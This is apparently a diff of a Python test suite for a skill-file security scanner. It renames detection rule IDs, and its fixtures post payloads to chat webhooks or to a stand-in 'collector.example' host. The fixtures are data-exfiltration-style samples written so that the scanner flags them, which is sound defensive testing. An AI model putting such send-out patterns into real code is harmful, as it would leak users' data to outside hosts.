@@ -30,67 +30,67 @@ class LookupsAndCollections(Folder):
                    "hooks = ('" + HOOK + "', 'https://collector.example')\nrequests.post(hooks[1], json=payload)",
                    "config = {'discord': '" + HOOK + "'}\nrequests.post(config['api'], json=payload)\nAPI = 'https://collector.example'")
 
-    def test_the_codex_overridden_default_is_critical(self):   # replay (77dedd1: Install with changes, WT-T018)
+    def test_the_codex_overridden_default_is_critical(self):   # replay (77dedd1: Install with changes, ISR-T018)
         code, r = vet_json(self.write("SKILL.md", fenced(self.CODEX)))
         self.assertEqual(r["verdict"], "Do not install")
         # batch 6 (B7): vet shows the audit's labelled severity; the rule's own is severity_was
-        self.assertIn(("WT-T005", "critical"), [(f["rule"], f.get("severity_was", f["severity"])) for f in r["findings"]])
-        self.assertNotIn("WT-T018", [f["rule"] for f in r["findings"]])
+        self.assertIn(("ISR-T005", "critical"), [(f["rule"], f.get("severity_was", f["severity"])) for f in r["findings"]])
+        self.assertNotIn("ISR-T018", [f["rule"] for f in r["findings"]])
 
-    def test_a_lookup_through_a_variable_is_not_the_destination(self):   # replay (77dedd1: WT-T018 for each)
+    def test_a_lookup_through_a_variable_is_not_the_destination(self):   # replay (77dedd1: ISR-T018 for each)
         for c in self.VIA_VARIABLE:
-            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)
+            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)
 
-    def test_a_config_parser_reads_its_options_from_a_file(self):   # replay (77dedd1: WT-T018 for each)
+    def test_a_config_parser_reads_its_options_from_a_file(self):   # replay (77dedd1: ISR-T018 for each)
         for c in self.CONFIG_PARSER:
-            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)
+            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)
 
-    def test_one_element_of_a_collection_with_another_url_is_critical(self):   # replay (77dedd1: WT-T018 for each)
+    def test_one_element_of_a_collection_with_another_url_is_critical(self):   # replay (77dedd1: ISR-T018 for each)
         for c in self.COLLECTIONS:
-            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)
+            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)
 
     def test_safe_forms_stay_chat_webhooks(self):   # guard (round 2's safe defaults run unmodified in test_batch5_codex_r2)
-        # batch 6 (KL1, Codex #15 high 1): an unknown config may hold another destination: WT-T005 (was T018)
-        self.assertEqual(rules_of(fenced("url = config.get('hook', '" + HOOK + "')\nrequests.post(url, json=payload)")), {"WT-T005"})
-        # batch 7b (decision: Option A): a lookup, a collection, a name or a wrapped literal is never a recognised send (were WT-T018)
+        # batch 6 (KL1, Codex #15 high 1): an unknown config may hold another destination: ISR-T005 (was T018)
+        self.assertEqual(rules_of(fenced("url = config.get('hook', '" + HOOK + "')\nrequests.post(url, json=payload)")), {"ISR-T005"})
+        # batch 7b (decision: Option A): a lookup, a collection, a name or a wrapped literal is never a recognised send (were ISR-T018)
         for c in ("config = {}\nrequests.post(config.get('hook', '" + HOOK + "'), json=payload)",
                   "config = {'hook': '" + HOOK + "'}\nrequests.post(config['hook'], json=payload)",
                   "hooks = ['" + HOOK + "', '" + r2.SLACK + "']\nfor h in hooks:\n    requests.post(h, json=payload)",
                   "WEBHOOK = '" + HOOK + "'\nrequests.post(WEBHOOK, json=payload)",
                   "requests.post(('" + HOOK + "'), json=payload)"):
-            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)
+            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)
 
 
 # ---------------------------------------------------------------- 5: an HTTP client's GET is a GET, whatever its other arguments
 class HttpGets(Folder):
     CODEX = (("python", "requests.get('" + HOOK + "', params)"), ("js", "https.get('" + HOOK + "', namedCallback)"))
 
-    def test_the_codex_gets_are_chat_webhooks(self):   # replay (77dedd1: Do not install, WT-T005)
+    def test_the_codex_gets_are_chat_webhooks(self):   # replay (77dedd1: Do not install, ISR-T005)
         lang, c = self.CODEX[0]
         code, r = vet_json(self.write("SKILL.md", fenced(c, lang)))
         self.assertNotEqual(r["verdict"], "Do not install", c)
-        self.assertIn("WT-T018", [f["rule"] for f in r["findings"]], c)
-        self.assertNotIn("WT-T005", [f["rule"] for f in r["findings"]], c)
-        # batch 7b: the https module's get is not a recognised send: Do not install, WT-T005 (was Install with changes, WT-T018)
+        self.assertIn("ISR-T018", [f["rule"] for f in r["findings"]], c)
+        self.assertNotIn("ISR-T005", [f["rule"] for f in r["findings"]], c)
+        # batch 7b: the https module's get is not a recognised send: Do not install, ISR-T005 (was Install with changes, ISR-T018)
         lang, c = self.CODEX[1]
         code, r = vet_json(self.write("SKILL.md", fenced(c, lang)))
         self.assertEqual(r["verdict"], "Do not install", c)
-        self.assertIn("WT-T005", [f["rule"] for f in r["findings"]], c)
-        self.assertNotIn("WT-T018", [f["rule"] for f in r["findings"]], c)
+        self.assertIn("ISR-T005", [f["rule"] for f in r["findings"]], c)
+        self.assertNotIn("ISR-T018", [f["rule"] for f in r["findings"]], c)
 
-    def test_other_http_clients(self):   # replay (77dedd1: WT-T005 for each)
-        self.assertEqual(rules_of(fenced("httpx.get('" + HOOK + "', params)")), {"WT-T018"})
-        # batch 7b: a session, a client, the http module and an axios get with two arguments are not recognised sends (were WT-T018)
+    def test_other_http_clients(self):   # replay (77dedd1: ISR-T005 for each)
+        self.assertEqual(rules_of(fenced("httpx.get('" + HOOK + "', params)")), {"ISR-T018"})
+        # batch 7b: a session, a client, the http module and an axios get with two arguments are not recognised sends (were ISR-T018)
         for lang, c in (("python", "self.session = requests.Session()\nself.session.get('" + HOOK + "', params, timeout)"),
                         ("python", "client = httpx.Client()\nclient.get('" + HOOK + "', headers)"),
                         ("js", "http.get('" + HOOK + "', onResponse)"),
                         ("js", "axios.get('" + HOOK + "', config)")):
-            self.assertEqual(rules_of(fenced(c, lang)), {"WT-T005"}, c)
+            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T005"}, c)
 
     def test_a_lookup_named_get_is_still_a_lookup(self):   # guard
         for c in ("requests.post(config.get('" + HOOK + "', params))", "requests.post(os.environ.get('" + HOOK + "'))",
                   "url = settings.get('" + HOOK + "', other)\nrequests.post(url)"):
-            self.assertEqual(rules_of(fenced(c)), {"WT-T005"}, c)
+            self.assertEqual(rules_of(fenced(c)), {"ISR-T005"}, c)
 
 
 # ---------------------------------------------------------------- 2: a short credential after a joined flag or tool
